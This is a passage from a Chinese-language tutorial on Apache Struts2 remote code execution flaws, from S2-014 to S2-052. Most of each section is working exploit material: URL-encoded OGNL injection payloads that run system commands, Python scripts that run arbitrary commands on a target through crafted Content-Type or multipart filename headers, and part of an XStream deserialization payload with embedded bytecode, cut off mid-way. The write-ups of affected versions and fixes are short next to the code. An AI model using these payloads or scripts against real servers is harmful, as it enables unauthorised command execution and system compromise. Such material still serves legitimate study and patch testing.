%23out.close()%7D)
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636630560746-20c58850-342f-49b9-8341-12c3fd6c0f4e.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=344&id=uc857d8f7&margin=%5Bobject%20Object%5D&name=image.png&originHeight=687&originWidth=1608&originalType=binary&ratio=1&rotation=0&showTitle=false&size=54765&status=done&style=none&taskId=uafbae9ad-90d0-4701-b1a6-f40e3b43315&title=&width=804)


S2-014 是对 S2-013 的修正。因为当S2-013固定时，${ognl_exp}等OGNL表达式的执行方法被忽略了，S2-014是针对它的增强补丁。
```php
http://192.168.0.1:8050/link.action?xxxx=%24%7B%28%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%29%28%23_memberAccess%5B%27allowStaticMethodAccess%27%5D%3Dtrue%29%28@java.lang.Runtime@getRuntime%28%29.exec%28%22open%20%2fApplications%2fCalculator.app%22%29%29%7D
```
### 漏洞修复
**建议升级到最新版本**



------


## 0x08 Struts2-015远程代码执行漏洞(CVE-2013-2135, CVE-2013-2134)
### 漏洞简介
**Struts 2 允许基于通配符定义动作映射，如下例所示：**
```php
<package name="S2-015" extends="struts-default">
    <action name="*" class="com.demo.action.PageAction">
        <result>/{1}.jsp</result>
    </action>
</package>
```
**如果一个请求与任何其他定义的动作不匹配，它将被 * 匹配，并且请求的动作名称将用于根据动作名称加载 JSP 文件。由于 {1} 的值作为 OGNL 表达式受到威胁，因此允许在服务器端执行任意 Java 代码。这个漏洞是两个问题的组合：**

1. **请求的操作名称未转义或再次检查白名单**
1. **当用$和%开放字符的组合时，对TextParseUtil.translateVariables 中的OGNL表达式进行双重评估**



### 影响版本
**Apache Struts 2.0.0 - Apache Struts 2.3.14.2**
**​**

### 利用过程
#### 漏洞利用代码
```php
http://192.168.0.1:8100/${#context['xwork.MethodAccessor.denyMethodExecution']=false,#m=#_memberAccess.getClass().getDeclaredField('allowStaticMethodAccess'),#m.setAccessible(true),#m.set(#_memberAccess,true),#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream()),#q}
```
需要用url进行编码
```php
http://192.168.0.1:8100/%24%7B%23context%5B%27xwork.MethodAccessor.denyMethodExecution%27%5D%3Dfalse%2C%23m%3D%23_memberAccess.getClass%28%29.getDeclaredField%28%27allowStaticMethodAccess%27%29%2C%23m.setAccessible%28true%29%2C%23m.set%28%23_memberAccess%2Ctrue%29%2C%23q%3D@org.apache.commons.io.IOUtils@toString%28@java.lang.Runtime@getRuntime%28%29.exec%28%27whoami%27%29.getInputStream%28%29%29%2C%23q%7D.action
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636631437551-8b31609a-c25b-4c0a-a360-e5e76da6c6c8.png#clientId=u6c33c8a5-27c9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=267&id=uc6019c19&margin=%5Bobject%20Object%5D&name=image.png&originHeight=533&originWidth=1906&originalType=binary&ratio=1&rotation=0&showTitle=false&size=95394&status=done&style=none&taskId=u7004e63a-64ad-43f8-bc59-336eec4d2bf&title=&width=953)
### 漏洞修复

建议升级到最新版本

------

## 0x09 Struts2-016远程代码执行漏洞(CVE-2013-2251)
### 漏洞简介
**Struts2 是第二代基于Model-View-Controller (MVC)模型的java企业级web应用框架。它是WebWork和Struts社区合并后的产物。Apache Struts2的action:、redirect:和redirectAction:前缀参数在实现其功能的过程中使用了Ognl表达式，并将用户通过URL提交的内容拼接入Ognl表达式中，从而造成攻击者可以通过构造恶意URL来执行任意Java代码，进而可执行任意命令。redirect:和redirectAction:此两项前缀为Struts默认开启功能，目前Struts 2.3.15.1以下版本均存在此漏洞。**
[

](https://blog.csdn.net/qq_41880069/article/details/89857081)
### 影响版本
**Apache Struts 2.0.0 - Apache Struts 2.3.15**
### 
### 利用过程
#### 漏洞利用代码
**执行uname -a命令**
```php
/index.action?redirect%3a%24%7b%23req%3d%23context.get('co'%2b'm.open'%2b'symphony.xwo'%2b'rk2.disp'%2b'atcher.HttpSer'%2b'vletReq'%2b'uest')%2c%23resp%3d%23context.get('co'%2b'm.open'%2b'symphony.xwo'%2b'rk2.disp'%2b'atcher.HttpSer'%2b'vletRes'%2b'ponse')%2c%23resp.setCharacterEncoding('UTF-8')%2c%23ot%3d%23resp.getWriter%20()%2c%23ot.print('web')%2c%23ot.print('path%3a')%2c%23ot.print(%23req.getSession().getServletContext().getRealPath('%2f'))%2c%23ot.flush()%2c%23ot.close()%7d%20
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636632505663-729f261c-afcd-4215-b0e3-3ae65751d0f3.png#clientId=udaa5e051-dffb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=265&id=u19d73dc2&margin=%5Bobject%20Object%5D&name=image.png&originHeight=530&originWidth=1456&originalType=binary&ratio=1&rotation=0&showTitle=false&size=119199&status=done&style=none&taskId=u198cdd20-d057-4fc0-b882-df443ef8c8e&title=&width=728)
**获取网页目录：**

```php
/index.action?redirect%3a%24%7b%23req%3d%23context.get('co'%2b'm.open'%2b'symphony.xwo'%2b'rk2.disp'%2b'atcher.HttpSer'%2b'vletReq'%2b'uest')%2c%23resp%3d%23context.get('co'%2b'm.open'%2b'symphony.xwo'%2b'rk2.disp'%2b'atcher.HttpSer'%2b'vletRes'%2b'ponse')%2c%23resp.setCharacterEncoding('UTF-8')%2c%23ot%3d%23resp.getWriter%20()%2c%23ot.print('web')%2c%23ot.print('path%3a')%2c%23ot.print(%23req.getSession().getServletContext().getRealPath('%2f'))%2c%23ot.flush()%2c%23ot.close()%7d%20
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636632593581-710a6a95-acb7-419a-bda9-a4a7b86925a9.png#clientId=udaa5e051-dffb-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=260&id=ud586a481&margin=%5Bobject%20Object%5D&name=image.png&originHeight=519&originWidth=1352&originalType=binary&ratio=1&rotation=0&showTitle=false&size=108186&status=done&style=none&taskId=u5db3c20a-5fb8-4e1f-a714-165a2fe626d&title=&width=676)

### 漏洞修复
**建议升级到最新版本**



------

## 0x10 Sturts2-032远程代码执行漏洞(CVE-2016-3081)
### 漏洞简介
**Apache Struts 2中存在命令注入漏洞。当程序启用Dynamic Method Invocation时，远程攻击者可借助method：前缀利用该漏洞在服务器端执行任意代码。**


### 影响版本
**Apache Struts 2.3.20 - Apache Struts 2.3.28（2.3.20.3 和 2.3.24.3 除外）**


### 利用过程
#### 漏洞利用代码
```php
http://192.168.0.1:11867/index.action?method:%23_memberAccess%3d@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS,%23res%3d%40org.apache.struts2.ServletActionContext%40getResponse(),%23res.setCharacterEncoding(%23parameters.encoding%5B0%5D),%23w%3d%23res.getWriter(),%23s%3dnew+java.util.Scanner(@java.lang.Runtime@getRuntime().exec(%23parameters.cmd%5B0%5D).getInputStream()).useDelimiter(%23parameters.pp%5B0%5D),%23str%3d%23s.hasNext()%3f%23s.next()%3a%23parameters.ppp%5B0%5D,%23w.print(%23str),%23w.close(),1?%23xx:%23request.toString&pp=%5C%5CA&ppp=%20&encoding=UTF-8&cmd=id
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636624967454-7b1f7bf3-de70-4a84-8fd0-d8575f50e150.png#clientId=u3d33328f-93e9-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=316&id=ub926128e&margin=%5Bobject%20Object%5D&name=image.png&originHeight=631&originWidth=1667&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55198&status=done&style=none&taskId=u4947280d-c405-4872-9d8d-221a9721a71&title=&width=833.5)


### 漏洞修复
目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
[https://struts.apache.org/docs/s2-032.html](https://struts.apache.org/docs/s2-032.html)
​

------

## 0x11 Struts2-045远程代码执行漏洞(CVE-2017-5638)
### 漏洞简介
**Apache Struts是美国阿帕奇（Apache）软件基金会的一个开源项目，是一套用于创建企业级Java Web应用的开源MVC框架，主要提供两个版本框架产品，Struts 1和Struts 2。**
**Apache Struts 2 2.3.32之前的2 2.3.x版本和2.5.10.1之前的2.5.x版本中的Jakarta Multipart解析器存在安全漏洞，该漏洞源于程序没有正确处理文件上传。远程攻击者可借助带有＃cmd=字符串的特制Content-Type HTTP头利用该漏洞执行任意命令。**


### 影响版本
**受影响的版本：Struts 2.3.5 - Struts 2.3.31、Struts 2.5 - Struts 2.5.10**


### 利用过程
#### 利用代码
**发起http请求时，将数据包http头部Content-Type改成下面代码发送即可**
```php
Content-Type：%{(#_='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='要执行的命令').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636454137675-dd54dc8f-aa5a-4a60-9178-809a5f69deb5.png#crop=0&crop=0&crop=1&crop=1&height=346&id=u350dedd6&margin=%5Bobject%20Object%5D&name=image.png&originHeight=692&originWidth=1460&originalType=binary&ratio=1&rotation=0&showTitle=false&size=154205&status=done&style=none&title=&width=730)
#### Python漏洞验证脚本
```php
import requests
import sys
import random

def poc(url):
    random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse']."
    payload += "addHeader('%s','%s')}.multipart/form-data" % (random_string, random_string)
    headers = {'Content-Type': str(payload)}
    resp = requests.get(url, headers=headers, verify=False, allow_redirects=False)
    if ((random_string in resp.headers.keys()) and (resp.headers[random_string] == random_string)):
        return(True)
    return(False)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage：%s <target>" % (sys.argv[0]))
        sys.exit()
    elif poc(sys.argv[1]):
        print("Vulnerable")
    else:
        print("not vulnerable")

```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636453863433-2369d575-1a0d-4ae2-a34c-98cb4ace824c.png#crop=0&crop=0&crop=1&crop=1&height=193&id=ufb811144&margin=%5Bobject%20Object%5D&name=image.png&originHeight=385&originWidth=1846&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62507&status=done&style=none&title=&width=923)
#### Python漏洞利用脚本
```php
import requests
import sys

def exploit(url,cmd):
    payload = "%{(#_='multipart/form-data')."
    payload += "(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?"
    payload += "(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear())."
    payload += "(#context.setMemberAccess(#dm))))."
    payload += "(#cmd='%s')." % cmd
    payload += "(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win')))."
    payload += "(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd}))."
    payload += "(#p=new java.lang.ProcessBuilder(#cmds))."
    payload += "(#p.redirectErrorStream(true)).(#process=#p.start())."
    payload += "(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream()))."
    payload += "(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros))."
    payload += "(#ros.flush())}"
    header = {"User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
              "Content-Type":payload}
    timeout = 3
    try:
        response = requests.get(url,headers=header,verify=False,timeout=3,allow_redirects=False)
    except requests.exceptions.ChunkedEncodingError:
        try:
            response = b""
            with requests.get(url=url, headers=header, verify=False, timeout=timeout, stream=True) as resp:
                for i in resp.iter_content():
                    response += i
        except requests.exceptions.ChunkedEncodingError as e:
            print("EXCEPTION::::--> " + str(e))
            print("Note: Server Connection Closed Prematurely\n")
        except Exception as e:
            print("EXCEPTION::::--> " + str(e))
            response = 'ERROR'
        if type(response) != str:
            response = response.decode('utf-8')
        return (response)
    except Exception as e:
        print("EXCEPTION::::--> " + str(e))
        output = 'ERROR'
    return (response)

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("python3 struts2-045.py url cmd")
        sys.exit()
    else:
        url = sys.argv[1]
        cmd = sys.argv[2]
        res = exploit(url,cmd)
        print(res)
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636453796381-d0e8cbeb-efcb-474f-8da3-918c2de30976.png#crop=0&crop=0&crop=1&crop=1&height=273&id=u6ff0303b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=545&originWidth=1788&originalType=binary&ratio=1&rotation=0&showTitle=false&size=86142&status=done&style=none&title=&width=894)
### 漏洞修复
目前厂商已经发布了升级补丁以修复此安全问题，补丁获取链接：
[https://cwiki.apache.org/confluence/display/WW/S2-045](https://cwiki.apache.org/confluence/display/WW/S2-045)



------


## 0x12 Struts2-046远程代码执行漏洞（CVE-2017-5638）
### 漏洞简介
**Apache Struts2存在远程代码执行漏洞，攻击者可以将恶意代码放入http报文头部的Content-Disposition的filename字段，通过不恰当的filename字段或者大小超过2G的Content-Length字段来触发异常，进而导致任意代码执行。**
​

### 影响版本
**Struts 2.3.5 - Struts 2.3.31, Struts 2.5 - Struts 2.5.10**
**​**

### 利用过程
#### 漏洞利用代码
```php
"%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())} b"
```
#### Python漏洞验证脚本
```php
import socket

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Test',233*233)}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q), )

with socket.create_connection(('192.168.0.1', '21601'), timeout=5) as conn:
    conn.send(p + q)
    print(conn.recv(10240).decode())
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636619441904-bf1965a7-d429-40c7-8c1e-f846a13e74bb.png#clientId=u0b84f197-9653-4&crop=0&crop=0&crop=1&crop=1&from=paste&height=265&id=uee39089a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=530&originWidth=1844&originalType=binary&ratio=1&rotation=0&showTitle=false&size=81082&status=done&style=none&taskId=u1ae3c8b4-6ebe-40b2-93b8-56ade698001&title=&width=922)

#### Python漏洞利用脚本

```php
import socket

q = b'''------WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Disposition: form-data; name="upload"; filename="%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='ls').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}\x00b"
Content-Type: text/plain

foo
------WebKitFormBoundaryXd004BVJN9pBYBL2--'''.replace(b'\n', b'\r\n')
p = b'''POST / HTTP/1.1
Host: localhost:8080
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2924.87 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.8,es;q=0.6
Connection: close
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryXd004BVJN9pBYBL2
Content-Length: %d

'''.replace(b'\n', b'\r\n') % (len(q), )

with socket.create_connection(('192.168.0.1', '21601'), timeout=5) as conn:
    conn.send(p + q)
    print(conn.recv(10240).decode())
```
### 
### 漏洞修复
升级Struts版本，更新到Struts2.3.32以上或者Struts2.5.10.1以上版本，或者直接升级到Struts的最新版本。



------

## 0x013 struts2-048 远程代码执行(CVE-2017-9791）
### 漏洞简介
Apache Struts 1插件的Apache Struts 2.3.X版本中存在远程代码执行漏洞,该漏洞出现于Struts2的某个类中，该类是为了将Struts1中的Action包装成为Struts2中的Action，以保证Struts2的兼容性。在Struts2中的Struts1插件启用的情况下，远程攻击者可通过使用恶意字段值，构造特定的输入，发送到ActionMessage类中，从而导致任意命令执行，进而获取目标主机系统权限


### 影响版本
Apache Struts 2.3.x系列中启用了struts2-struts1-plugin插件的版本


### 利用过程
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636462872286-c05d473a-da73-4165-8274-72f3428fbc36.png#crop=0&crop=0&crop=1&crop=1&height=319&id=u34980381&margin=%5Bobject%20Object%5D&name=image.png&originHeight=637&originWidth=1635&originalType=binary&ratio=1&rotation=0&showTitle=false&size=66482&status=done&style=none&title=&width=817.5)
#### 漏洞利用代码1
```php
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime().exec('id').getInputStream())).(#q)}
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636463034118-d608f8f6-d632-490b-ad4e-6f17e42304c7.png#crop=0&crop=0&crop=1&crop=1&height=250&id=ua8f2af12&margin=%5Bobject%20Object%5D&name=image.png&originHeight=500&originWidth=1388&originalType=binary&ratio=1&rotation=0&showTitle=false&size=138864&status=done&style=none&title=&width=694)
#### 漏洞利用代码2
```php
%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='id').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}
```
![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1636463653887-e2119495-3723-4b68-b131-6b06d1e19975.png#crop=0&crop=0&crop=1&crop=1&height=337&id=ue685b54b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=674&originWidth=1343&originalType=binary&ratio=1&rotation=0&showTitle=false&size=145187&status=done&style=none&title=&width=671.5)
#### Python漏洞验证脚本
```php
import sys
import requests
import re
import random
from urllib.parse import  quote,unquote

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

def verifi(url):
    random_string = ''.join(random.choice('abcdefghijklmnopqrstuvwxyz') for i in range(7))
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
    payload += "(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime()."
    payload += "exec('echo %s').getInputStream())).(#q)}" % random_string
    data = "name=" + quote(payload) + "&age=123&__checkbox_bustedBefore=true&description=123"
    header = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"}

    if "integration" not in url:
        url = url + "/integration/saveGangster.action"

    try:
        response = requests.post(url,data=data,headers=header,verify=False,allow_redirects=False)
        result = re.search(r'<span>Gangster([\s\S]*)added', response.text)
        if response.status_code == 200 and result.group(1).strip() == random_string:
            return(True)
    except Exception as e:
        print(e)
        pass
    return(False)

if __name__ == '__main__':
    if len(sys.argv) != 2:
        print("Usage：%s <target>" % (sys.argv[0]))
    else:
        try:
            result = verifi(sys.argv[1])
            if result == True:
                print('[+]%s Vulnerable!')
            else:
                print("[-]Not Affected.")
        except Exception as e:
            print(e)
            pass
```
#### Python漏洞利用脚本
```php
import requests
import sys
from urllib.parse import  quote,unquote
import re

try:
    import requests.packages.urllib3
    requests.packages.urllib3.disable_warnings()
except:
    pass

def exploit(url,cmd):
    payload = "%{(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)."
    payload += "(#_memberAccess?(#_memberAccess=#dm):"
    payload += "((#container=#context['com.opensymphony.xwork2.ActionContext.container'])."
    payload += "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))."
    payload += "(#ognlUtil.getExcludedPackageNames().clear())."
    payload += "(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm))))."
    payload += "(#q=@org.apache.commons.io.IOUtils@toString(@java.lang.Runtime@getRuntime()."
    payload += "exec('%s').getInputStream())).(#q)}" % cmd
    data = "name=" + quote(payload) + "&age=123&__checkbox_bustedBefore=true&description=123"
    header = {
        "User-Agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/93.0.4577.82 Safari/537.36",
        "Content-Type":"application/x-www-form-urlencoded"}

    if "integration" not in url:
        url = url + "/integration/saveGangster.action"

    try:
        response = requests.post(url,data=data,headers=header,verify=False,allow_redirects=False)
        if response.status_code == 200 and 'status2-showcase' not in response.text:
            re1 = re.search(r'<span>Gangster([\s\S]*)added', response.text)
    except Exception as e:
        print(e)
        pass
    return(re1.group(1))

if __name__ == '__main__':
    if len(sys.argv) != 3:
        print("Usage：%s <target> <cmd>" % (sys.argv[0]))
    else:
        try:
            print((exploit(sys.argv[1],sys.argv[2])))
        except Exception as e:
            print(e)
            pass
```
### 漏洞修复
目前厂商暂未发布升级补丁解决此安全问题，但提供了缓解方案，详情请关注厂商公告：
[http://struts.apache.org/docs/s2-048.html](http://struts.apache.org/docs/s2-048.html)
​

------

## 0x014 Struts2-052远程代码执行漏洞(CVE-2017-9805)
### 漏洞简介
**Apache Struts发布最新安全公告，Apache Struts2的REST插件存在远程代码执行的高危漏洞，该漏洞由lgtm.com的安全研究员汇报，漏洞编号为CVE-2017-9805（S2-052）。Struts2 REST插件的XStream组件存在反序列化漏洞，使用XStream组件对XML格式的数据包进行反序列化操作时，未对数据内容进行有效验证，存在安全隐患，可被远程攻击。**


### 影响版本
**Struts 2.1.2 - Struts 2.3.33, Struts 2.5 - Struts 2.5.12**
​

### 利用过程
#### Python漏洞验证代码
```php
import requests
import sys
import argparse
if len(sys.argv) != 2:
    print("Usage：%s <target>" % sys.argv[0])
    sys.exit()

def url_check(url):
    if "://" not in url:
        url = "http://" + url
    if "orders" not in url:
        url = url + "/orders/3/edit"
    return url


def verify(url):
    url = url_check(url)
    payload_sleep_based_10seconds = """<map>
            <entry>
        <jdk.nashorn.internal.objects.NativeString>
          <flags>0</flags>
          <value class="com.sun.xml.internal.bind.v2.runtime.unmarshaller.Base64Data">
            <dataHandler>
              <dataSource class="com.sun.xml.internal.ws.encoding.xml.XMLMessage$XmlDataSource">
                <is class="javax.crypto.CipherInputStream">
                  <cipher class="javax.crypto.NullCipher">
                    <initialized>false</initialized>
                    <opmode>0</opmode>
                    <serviceIterator class="javax.imageio.spi.FilterIterator">
                      <iter class="javax.imageio.spi.FilterIterator">
                        <iter class="java.util.Collections$EmptyIterator"/>
                        <next class="com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl" serialization="custom">
                          <com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl>
                            <default>
                              <__name>Pwnr</__name>
                              <__bytecodes>
                                <byte-array>yv66vgAAADIAMwoAAwAiBwAxBwAlBwAmAQAQc2VyaWFsVmVyc2lvblVJRAEAAUoBAA1Db25zdGFu
    dFZhbHVlBa0gk/OR3e8+AQAGPGluaXQ+AQADKClWAQAEQ29kZQEAD0xpbmVOdW1iZXJUYWJsZQEA
    EkxvY2FsVmFyaWFibGVUYWJsZQEABHRoaXMBABNTdHViVHJhbnNsZXRQYXlsb2FkAQAMSW5uZXJD
    bGFzc2VzAQA1THlzb3NlcmlhbC9wYXlsb2Fkcy91dGlsL0dhZGdldHMkU3R1YlRyYW5zbGV0UGF5
    bG9hZDsBAAl0cmFuc2Zvcm0BAHIoTGNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94
    c2x0Yy9ET007W0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2Vy
    aWFsaXphdGlvbkhhbmRsZXI7KVYBAAhkb2N1bWVudAEALUxjb20vc3VuL29yZy9hcGFjaGUveGFs
    YW4vaW50ZXJuYWwveHNsdGMvRE9NOwEACGhhbmRsZXJzAQBCW0xjb20vc3VuL29yZy9hcGFjaGUv
    eG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKRXhjZXB0aW9u
    cwcAJwEApihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtMY29t
    L3N1bi9vcmcvYXBhY2hlL3htbC9pbnRlcm5hbC9kdG0vRFRNQXhpc0l0ZXJhdG9yO0xjb20vc3Vu
    L29yZy9hcGFjaGUveG1sL2ludGVybmFsL3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7
    KVYBAAhpdGVyYXRvcgEANUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1B
    eGlzSXRlcmF0b3I7AQAHaGFuZGxlcgEAQUxjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFs
    L3NlcmlhbGl6ZXIvU2VyaWFsaXphdGlvbkhhbmRsZXI7AQAKU291cmNlRmlsZQEADEdhZGdldHMu
    amF2YQwACgALBwAoAQAzeXNvc2VyaWFsL3BheWxvYWRzL3V0aWwvR2FkZ2V0cyRTdHViVHJhbnNs
    ZXRQYXlsb2FkAQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRp
    bWUvQWJzdHJhY3RUcmFuc2xldAEAFGphdmEvaW8vU2VyaWFsaXphYmxlAQA5Y29tL3N1bi9vcmcv
